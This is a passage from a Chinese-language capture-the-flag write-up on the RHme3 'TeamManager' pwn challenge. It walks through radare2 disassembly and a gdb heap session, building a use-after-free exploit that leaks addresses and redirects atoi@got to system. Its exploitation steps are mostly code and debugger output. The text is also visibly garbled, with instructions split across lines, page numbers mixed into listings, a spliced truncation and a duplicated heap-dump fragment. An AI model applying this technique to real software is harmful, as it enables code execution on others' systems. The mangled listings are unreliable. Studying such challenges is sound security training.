| | 0x004020f9 4889c7 mov rdi, rax
; 球员地址 rax -> rdi
| | 0x004020fc e88af6ffff call sym.show_player_
func ; 调用函数 sym.show_player_func 打印出球员信息
| | ; JMP XREF from 0x004020f0 (sym.show_player)
| `--> 0x00402101 488b45f8 mov rax, qword [local
_8h]
| 0x00402105 644833042528. xor rax, qword fs:[0x
1046
6.1.9 pwn RHme3 Exploitation
28]
| ,= 0x00402115 c9 leave
\ 0x00402116 c3 ret
在该函数中，也未检查选中球员是否还存在，这就导致了信息泄露。
函数 sym.edit_player 可以调用函数 sym.set_name 修改 player name，但
其也不会对 selected 的值做检查，配合上信息泄露，可以导致任意地址写。
[0x00400ec0]> pdf @ sym.set_name
/ (fcn) sym.set_name 281
| sym.set_name ();
| ; var int local_128h @ rbp-0x128
| ; var int local_120h @ rbp-0x120
| ; var int local_18h @ rbp-0x18
| ; CALL XREF from 0x00402058 (sym.edit_player + 10
1)
| 0x00401cdb 55 push rbp
| 0x00401cdc 4889e5 mov rbp, rsp
| 0x00401cdf 53 push rbx
| 0x00401ce0 4881ec280100. sub rsp, 0x128
| 0x00401ce7 64488b042528. mov rax, qword fs:[0x
28] ; [0x28:8]=-1 ; '(' ; 40
| 0x00401cf0 488945e8 mov qword [local_18h]
, rax
| 0x00401cf4 31c0 xor eax, eax
| 0x00401cf6 bf69254000 mov edi, str.Enter_ne
w_name: ; 0x402569 ; "Enter new name: "
| 0x00401cfb b800000000 mov eax, 0
| 0x00401d00 e8fbefffff call sym.imp.printf
; int printf(const char *format)
| 0x00401d05 488b05541420. mov rax, qword [obj.s
tdout] ; [0x603160:8]=0
| 0x00401d0c 4889c7 mov rdi, rax
| 0x00401d0f e8acf0ffff call sym.imp.fflush
; int fflush(FILE *stream)
1047
6.1.9 pwn RHme3 Exploitation
| 0x00401d14 488d85e0feff. lea rax, rbp - 0x120
| 0x00401d1b be00010000 mov esi, 0x100
; 256
| 0x00401d20 4889c7 mov rdi, rax
| 0x00401d23 e89bf7ffff call sym.readline
; 读入修改的字符串，即 system 的地址
| 0x00401d28 488d85e0feff. lea rax, rbp - 0x120
| 0x00401d2f 4889c7 mov rdi, rax
| 0x00401d32 e869efffff call sym.imp.strlen
; size_t strlen(const char *s)
| 0x00401d37 4889c3 mov rbx, rax
| 0x00401d3a 488b052f1420. mov rax, qword [obj.s
elected] ; [0x603170:8]=0
| 0x00401d41 488b4010 mov rax, qword [rax +
0x10] ; [0x10:8]=-1 ; 16
| 0x00401d45 4889c7 mov rdi, rax
| 0x00401d48 e853efffff call sym.imp.strlen
; size_t strlen(const char *s)
| 0x00401d4d 4839c3 cmp rbx, rax
| ,= 0x00401da7 488b05c21320. mov rax, qword [obj.s
elected] ; [0x603170:8]=0
| | | 0x00401dae 488b95d8feff. mov rdx, qword [local
_128h]
| | | 0x00401db5 48895010 mov qword [rax + 0x10
], rdx
| | | ; JMP XREF from 0x00401d50 (sym.set_name)
| | `-> 0x00401db9 488b05b01320. mov rax, qword [obj.s
elected] ; [0x603170:8]=0 ; 取出选中球员的地址
| | 0x00401dc0 488b4010 mov rax, qword [rax +
0x10] ; [0x10:8]=-1 ; 16 ; player.name 字段，即 atoi@got
| | 0x00401dc4 488d95e0feff. lea rdx, rbp - 0x120
; system@got
| | 0x00401dcb 4889d6 mov rsi, rdx
; rsi  0x00401dd6 488b45e8 mov rax, qword [local
_18h]
| 0x00401dda 644833042528. xor rax, qword fs:[0x
28]
| ,= 0x00401dea 4881c4280100. add rsp, 0x128
| 0x00401df1 5b pop rbx
| 0x00401df2 5d pop rbp
\ 0x00401df3 c3 ret
动态分析
漏洞大概清楚了，我们使用 gdb 动态调试一下，为了方便分析，先关闭 ASRL。
gef 有个很强大的命令 heap-analysis-helper ，可以追踪
malloc() 、 free() 、 realloc() 等函数的调用：
gef➤ heap-analysis-helper
[*] This feature is under development, expect bugs and unstabili
ty...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latenc
y)
[+] Dynamic breakpoints correctly setup, GEF will break executio
n if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution.
gef➤ c
Continuing.
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice: 1
Found free slot: 0
[+] Heap-Analysis - malloc(24)=0x604010
Enter player name: aaaa
[+] Heap-Analysis - malloc(5)=0x604030
Enter attack points: 1
Enter defense points: 2
1050
6.1.9 pwn RHme3 Exploitation
Enter speed: 3
Enter precision: 4
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice: 2
Enter index: 0
[+] Heap-Analysis - free(0x604030)
[+] Heap-Analysis - watching 0x604030
[+] Heap-Analysis - free(0x604010)
[+] Heap-Analysis - watching 0x604010
She's gone!
很好地验证了球员分配和删除的过程。
漏洞利用
alloc and select
然后是内存，根据我们对堆管理机制的理解，这里选择使用 small chunk（球员
name chunk）：
alloc('A' * 0x60)
alloc('B' * 0x80)
alloc('C' * 0x80)
select(1)
gef➤ x/4gx 0x603180
0x603180 : 0x0000000000604010 0x00000000006040a0
0x603190 : 0x0000000000604150 0x00000000000000
00
gef➤ x/70gx 0x604010-0x10
0x604000: 0x0000000000000000 0x0000000000000021 : 0x0000000000604010 0x0000000000000000
: 0x0000000000604150 0x00000000000000
00
gef➤ x/70gx 0x604010-0x10
0x604000: 0x0000000000000000 0x0000000000000021 <-- player
0
0x604010: 0x0000000200000001 0x0000000400000003
0x604020: 0x0000000000604030 0x0000000000000071 <-- name 0
0x604030: 0x4141414141414141 0x4141414141414141
0x604040: 0x4141414141414141 0x4141414141414141
0x604050: 0x4141414141414141 0x4141414141414141
0x604060: 0x4141414141414141 0x4141414141414141
0x604070: 0x4141414141414141 0x4141414141414141
0x604080: 0x4141414141414141 0x4141414141414141
0x604090: 0x0000000000000000 0x0000000000000021 <-- player
1 [be freed] <-- fastbins
0x6040a0: 0x0000000000000000 0x0000000400000003
<-- selected
0x6040b0: 0x00000000006040c0 0x0000000000000091 <-- name 1
[be freed] <-- unsorted_bin
0x6040c0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78
<-- fd | bk
0x6040d0: 0x4242424242424242 0x4242424242424242
0x6040e0: 0x4242424242424242 0x4242424242424242
0x6040f0: 0x4242424242424242 0x4242424242424242
0x604100: 0x4242424242424242 0x4242424242424242
1053
6.1.9 pwn RHme3 Exploitation
0x604110: 0x4242424242424242 0x4242424242424242
0x604120: 0x4242424242424242 0x4242424242424242
0x604130: 0x4242424242424242 0x4242424242424242
0x604140: 0x0000000000000090 0x0000000000000020 <-- player
2
0x604150: 0x0000000200000001 0x0000000400000003
0x604160: 0x0000000000604170 0x0000000000000091 <-- name 2
0x604170: 0x4343434343434343 0x4343434343434343
0x604180: 0x4343434343434343 0x4343434343434343
0x604190: 0x4343434343434343 0x4343434343434343
0x6041a0: 0x4343434343434343 0x4343434343434343